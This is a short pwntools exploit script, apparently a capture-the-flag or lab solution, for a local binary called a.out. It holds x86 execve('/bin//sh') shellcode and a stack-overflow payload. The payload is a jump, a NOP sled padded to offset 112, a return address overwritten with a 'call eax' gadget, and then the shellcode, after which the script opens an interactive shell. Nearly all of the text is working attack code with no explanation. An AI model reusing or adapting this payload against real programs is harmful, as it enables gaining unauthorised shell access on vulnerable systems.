from pwn import *

sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
#0x8048473 : call eax
jmp_d_eax = 0x8048473

p = process('a.out')
#gdb.attach(p, 'b * 0x804850b')
p.recvrepeat(1)

payload = '\xe9\x7c\x00\x00\x00' + '\x90' * (112-5) + p32(jmp_d_eax) + '\x90'*30 + sc
p.sendline(payload)

p.interactive()
